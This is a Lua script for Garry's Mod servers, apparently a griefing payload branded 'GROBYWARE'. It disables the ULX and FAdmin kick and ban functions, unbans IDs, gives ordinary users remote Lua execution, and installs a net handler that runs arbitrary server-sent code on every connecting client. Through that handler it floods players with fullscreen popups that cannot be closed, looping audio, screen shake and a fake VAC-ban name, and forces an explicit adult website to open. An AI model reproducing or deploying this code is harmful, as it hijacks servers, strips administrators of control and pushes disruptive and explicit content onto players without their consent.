--- Admin systems blocker (ulx, fadmin, vanila)
RunConsoleCommand( "sv_loadingurl", "жопа" )
for i=1,200 do RunConsoleCommand("removeid", i) RunConsoleCommand("removeid", "1") end
RunConsoleCommand("ulx","logecho","0")
RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun")
if ULib then
	function ULib.kick( ply, reason, calling_ply ) end
	function ULib.ban( ply, time, reason, admin ) end
	function ULib.addBan( steamid, time, reason, name, admin ) end
end
if FAdmin then
	local function no(ply) end
	FAdmin.Commands.AddCommand("kick", no)
	FAdmin.Commands.AddCommand("ban", no)
	FAdmin.Commands.AddCommand("jail", no)
	FAdmin.Commands.AddCommand("UnJail", no)
	FAdmin.Commands.AddCommand("ClearDecals", no)
	FAdmin.Commands.AddCommand("StopSounds", no)
	FAdmin.Commands.AddCommand("CleanUp", no)
end
local _R = debug.getregistry()
function _R.Player.Ban(ply, r) end
function _R.Player.Kick(ply, r) end
function game.KickID(id, reason) end
local RCM = RunConsoleCommand
function RunConsoleCommand(command, ...)
	if command == "addip" then return end
	RCM(command, ...)
end

for k,v in pairs(player.GetAll()) do v:addMoney(999999999) end

    timer.Create( "gtonip", 1, 0, function()
        for k,v in pairs(player.GetAll()) do
            v:GodEnable()
            v:setDarkRPVar( "rpname", "This Steam account has been VAC banned from secure servers due to a cheating infraction." )
        end

    end )
	
	RunConsoleCommand("sv_friction", "-8")

-- visuals / shit

util.AddNetworkString "slua"

local lol = {}
function lol:RandomString( intMin, intMax )
	local ret = ""
	for _ = 1, math.random( intMin, intMax ) do
		ret = ret.. string.char( math.random(65, 90) )
	end

	return ret
end

lol.m_tblActions = {}
lol.m_strImageGlobalVar = lol:RandomString( 6, 12 )
lol.m_strImageLoadHTML = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]

function lol:PushAction( intChainDelay, func )
	self.m_tblActions[#self.m_tblActions +1] = { intChainDelay, func }
end

function lol:NextAction( pPlayer )
	pPlayer.m_intCurAction = pPlayer.m_intCurAction +1
	if not self.m_tblActions[pPlayer.m_intCurAction] then return end

	timer.Simple( self.m_tblActions[pPlayer.m_intCurAction][1], function()
		if not IsValid( pPlayer ) then return end
		self.m_tblActions[pPlayer.m_intCurAction][2]( pPlayer )
		self:NextAction( pPlayer )
	end )
end

function lol:Start( pPlayer )
	pPlayer.m_intCurAction = 0
	self:NextAction( pPlayer )
end

function lol:SendLua( pPlayer, strLua )
	net.Start( "slua" )
		net.WriteString( strLua )
	net.Send( pPlayer )
end

function lol:SetupPlayer( pPlayer )
	pPlayer:SendLua( "net.Receive(\"slua\", function() RunString(net.ReadString()) end)" )
end

for k, v in pairs( player.GetAll() ) do
	lol:SetupPlayer( v )
	timer.Simple( 2, function() lol:Start( v ) end )
end

hook.Add( "PlayerAuthed", "wat", function( pPlayer )
	lol:SetupPlayer( pPlayer )
	timer.Simple( 10, function() lol:Start( pPlayer ) end )	
end )

--Sequence stack
--Start some tunes and steam in our assets
lol:PushAction( 0, function( pPlayer )
	lol:SendLua( pPlayer, [[
	
hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)

    sound.PlayURL( "жопа", "mono noblock noplay", function( station ) 
	timer.Simple( 0.1, function()                     
	ClientStation = station
	station:EnableLooping( true )
	station:Play()
	station:SetVolume( 30 )
	end )
    end )

    surface.CreateFont( "PixelCutsceneScaled",{
        font = "Open Sans", 
        size = 500,
        weight = 1000,
        antialias = true
    })

    surface.CreateFont( "PixelSmall",{
        font = "Open Sans", 
        size = 135,
        weight = 500,
        antialias = false
    })

    surface.CreateFont("lapolice", {
        font = "Open Sans",  
        size = ScrW()*0.02, 
        weight = 10, 
        blursize = 0, 
        scanlines = 2.5, 
        antialias = false
    })

    local function gettextcolor( a )
    
        local r = 0.5*math.sin(RealTime()*5.5)*255 + 255/2
        local g = -0.5*math.sin(RealTime()*5.5)*255 + 255/2
        local b = 215
    
        return Color( r, g, b, a or 255 )
    
    end

    local w,h = ScrW(), ScrH()
    local W, H = ScrW(), ScrH()
    local MySelf = LocalPlayer()
    
    if ohno then
        ohno:Remove()
        ohno = nil
    end
    
    ohno = vgui.Create( "DFrame" )
    ohno:SetSize( w, h )
    ohno:SetPos(0,0)
    ohno:SetDraggable ( false )
    ohno:SetTitle("")
    ohno:MakePopup();
    ohno:ShowCloseButton(false)

    ohno.Paint = function( self ) 
        Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
        Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
    end
    
    local pw, ph = w, h*0.6
    local px, py = w/2-pw/2, h/2-ph/2

    
    local Close = vgui.Create( "DButton", ohno )
    Close:SetPos(px, py)
    Close:SetText( "" )
    Close:SetSize( pw, ph ) 
    Close.Paint = function( self, tw, th )
            
        local shift = math.sin(RealTime()*3)*1.5 + 5
            
        local text = "hardbass"
        local text2 = "enginepred"
        local text3 = "1 TAPPED"
        local text4 = "hardbass"

            draw.SimpleText( text, "PixelCutsceneScaled", tw/2 , th/2, gettextcolor( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.SimpleText( text, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            draw.DrawText( "hardbass", "lapolice", ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), TEXT_ALIGN_CENTER )
            draw.DrawText( "hardbasshardbasshardbass", "lapolice", math.random(0,10), ScrH() * (math.random(0,100)*0.01), Color( 240, 100, 100, math.random(230,255) ), 0 )
            draw.DrawText( "hardbasshardbass", "lapolice", W * 0.7 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "hardbass", "lapolice", W * 0.38 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "hardbass", "lapolice", W * 0.9 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "1 TAPPED", "lapolice", W * 0.35 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "1 TAPPED", "lapolice", W * 0.98 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "1 TAPPED", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "1 TAPPED;)", "lapolice", W * 0.73 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "1 TAPPED", "lapolice", W * 0.27 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "1 TAPPED", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "1 TAPPED", "lapolice", W * 0.05 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "1 TAPPED", "lapolice", W * 0.11 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "hardbass", "lapolice", W * 0.75 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "hardbasshardbasshardbass", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "hardbasshardbass", "lapolice", W * 0.2 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "hardbass", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "1 TAPPED", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )
            draw.DrawText( "hardbass", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 240, 240, 240, math.random(230,255) ), 0 )   
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )
            draw.RoundedBox( 0, 0, math.random(0,W), W, H*0.001, Color(255,255,255,math.random(0,255) ) )

    end
    surface.PlaySound( "vo/npc/male01/ohno.wav" )
    surface.PlaySound( "vo/npc/male01/ohno.wav" )
    timer.Create("fff", 0.1, 0, function() 
        util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
    end)

    timer.Simple( 15, function()

        wut = vgui.Create( "DFrame" )
        wut:SetSize( w, h )
        wut:SetPos(0,0)
        wut:SetDraggable ( false )
        wut:SetTitle("")
        wut:ShowCloseButton(false)

        wut.Paint = function( self ) 
            surface.SetDrawColor(30, 30, 30, 0)
        end

        local Close = vgui.Create( "DButton", wut )
        Close:SetPos(px, py)
        Close:SetText( "" )
        Close:SetSize( pw, ph ) 
        Close.Paint = function( self, tw, th )
                
            local shift = math.sin(RealTime()*3)*1.5 + 5
                
            local text = "GROBYWARE"

                draw.SimpleText( text, "PixelCutsceneScaled", tw/2 , th/2, gettextcolor( 55 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
                draw.SimpleText( text, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

        end

        RunConsoleCommand("r_shader_srgb","1")

        ohno:Remove()
        ohno = nil

        local name = GetConVar("sv_skyname"):GetString()
        if name == "painted" then
          local sky
          for _, v in ipairs(ents.GetAll()) do
            if v:GetClass() == "env_skypaint" then
              sky = v
              break
            end
          end
          if !IsValid(sky) then return end
          hook.Add("PostRender","\xFFsky\xFF",function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            col = Vector(col.r/255,col.g/255,col.b/255)
            sky:SetTopColor(col)
            sky:SetBottomColor(col)
          end)
        else
          local prefix  = {"lf","ft","rt","bk","dn","up"}
          local mats = {}
          for i=1,6 do
            mats[#mats+1] = Material("skybox/" .. name .. prefix[i])
          end
          hook.Add("PostRender","\xFFsky\xFF",function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            for i=1,6 do
              mats[i]:SetVector("$color",Vector(col.r/255,col.g/255,col.b/255))
            end
          end)
        end
        local chienchaud = ClientsideModel("models/props_c17/doll01.mdl")
        chienchaud:SetNoDraw(true)
        chienchaud:SetModelScale(120)
        timer.Create("charglogo", 0.01, 0, function()
          chienchaud:SetAngles(Angle(0, CurTime()*90 % 360 ,180) )
        end)
        --chienchaud:SetMaterial( "models/screenspace" )
        local data = {}
        local function genchienchaud(id)
          local pos = LocalPlayer():GetPos()
          data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
        end
        for i=1, 150 do
          genchienchaud(i)
        end
        hook.Add("PostDrawOpaqueRenderables","\xFFitsrainingchienchauds\xFF",function()
          local z = LocalPlayer():GetPos().z
          for i=1, #data do
            chienchaud:SetPos(data[i][1])
            chienchaud:SetupBones()
            chienchaud:DrawModel()
            data[i][1].z = data[i][1].z - data[i][2] / 20
            if data[i][1].z <= z then
              genchienchaud(i)
            end
          end
        end)

		hook.Add("Think","somewhere_over_the_rainbow",function()
			local col = HSVToColor(CurTime() * 50 % 360, 1, 1)
				for _, v in ipairs(player.GetAll()) do
			v:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
			end
		end)

		timer.Create("CP_Gaymod",1,0,function()
			local mats = Entity(0):GetMaterials()
			for k,v in pairs(mats) do
			local r,g,b = ColorRand().r-50, ColorRand().g-50, ColorRand().b-50
				Material(v):SetVector("$color", Vector(r,g,b))
			end
		end)

timer.Create("ok", 1, 0, function() 
    for k, v in pairs( ents.FindByClass( "prop_*" ) ) do local phys = v:GetPhysicsObject()
        if (IsValid(phys)) then
            phys:EnableMotion(true)
        end 
    end

    local props = ents.GetAll()
    for _, prop in ipairs( props ) do
        if(prop:GetPhysicsObject():IsValid()) then
            prop:GetPhysicsObject():ApplyForceCenter( Vector( 0, 0, ((650 * 0.73) * prop:GetPhysicsObject():GetMass() ) ) )
        end
    end
end)

	end)
	
	
	timer.Simple( 34, function()
	
		local disco = vgui.Create("DHTML") disco:SetSize(400,400) disco:SetPos(200,0) disco:OpenURL("https://i.imgur.com/HxkMRIS.gif")
		local disco2 = vgui.Create("DHTML") disco2:SetSize(400,400) disco2:SetPos(ScrW()-550,0) disco2:OpenURL("https://i.imgur.com/HxkMRIS.gif")		
	end)

		
	timer.Simple( 53, function()
		
surface.CreateFont( "NEWS1", {font = "Arial",size = 70,weight = 2000,})
surface.CreateFont( "NEWS2", {font = "Arial",size = 150,weight = 2000,})
local newsPan1 = vgui.Create("DPanel")
		newsPan1:SetSize(ScrW(), 150)
		newsPan1:SetPos(0, ScrH()-150)
		newsPan1.Paint = function()
			surface.SetDrawColor(255,255,255,255)
			surface.DrawRect(0,0,newsPan1:GetWide(),newsPan1:GetTall())
			surface.SetDrawColor(0,230,255,255)
			surface.DrawRect(0,4,newsPan1:GetWide(),newsPan1:GetTall())
		end
	local newsPan2 = vgui.Create("DPanel")
		newsPan2:SetSize(ScrW(),ScrH())
		newsPan2:SetPos(0,0)
		newsPan2.Paint = function()
		local trap3 = {
			{x = ScrW()-504, y = ScrH()-150},
			{x = ScrW()-439, y = ScrH()-254},
			{x = ScrW(), y = ScrH()-254},
			{x = ScrW(), y = ScrH()-150},
		}
		local trap4 = {
			{x = ScrW()-500, y = ScrH()-146},
			{x = ScrW()-435, y = ScrH()-250},
			{x = ScrW(), y = ScrH()-250},
			{x = ScrW(), y = ScrH()-146},
		}
		local trap5 = {
			{x = ScrW()-475, y = ScrH()-156},
			{x = ScrW()-432, y = ScrH()-235},
			{x = ScrW()-8, y = ScrH()-235},
			{x = ScrW()-8, y = ScrH()-156},
		}
			draw.NoTexture()
			surface.SetDrawColor(255,255,255,255)
			surface.DrawPoly(trap3)
			draw.NoTexture()
			surface.SetDrawColor(0,240,255,255)
			surface.DrawPoly(trap4)
			draw.NoTexture()
			surface.SetDrawColor(0,230,255,255)
			surface.DrawPoly(trap5)
		end
	local title2 = vgui.Create("DLabel", newsPan2)
	title2:SetFont("NEWS1")
	title2:SetText("Gmod News")
	title2:SizeToContents()
	title2:SetPos(ScrW()-title2:GetWide()-55, ScrH()-254+title2:GetTall()/2-12)
	title2:SetColor(Color(255,255,255))

	local title3 = vgui.Create("DLabel", newsPan1)
	title3:SetFont("NEWS2")
	title3:SetText("BREAKING NEWS GMOD HAS BEEN INFECTED WITH PEWDIEPIE VIRUS CALL THE POLICE NOW!")
	title3:SizeToContents()
	title3:SetPos(ScrW(), 10)
	title3:SetColor(Color(255,255,255))
	timer.Create("movingtext2",.05,0,function()
		if title3:GetPos() >= 0-title3:GetWide() then
			title3:SetPos(Lerp(.5,title3:GetPos(),title3:GetPos()-10),10)
		else
			title3:SetPos(ScrW(),10)
		end
	end)

	timer.Simple( 63, function()
		
    if maymay then
        maymay:Remove()
        maymay = nil
    end
    
    maymay = vgui.Create( "DFrame" )
    maymay:SetSize( w, h )
    maymay:SetPos(0,0)
    maymay:SetDraggable ( false )
    maymay:SetTitle("")
    maymay:MakePopup();
    maymay:ShowCloseButton(false)

	local html = vgui.Create("HTML", maymay)
	html:Dock( FILL )
	html:OpenURL("https://www.gaytube.com/")

	end)
	
	timer.Simple( 70, function()
	
	maymay:Remove()
	maymay = nil	
	
		end)
	
	end)
		
	]])

end )
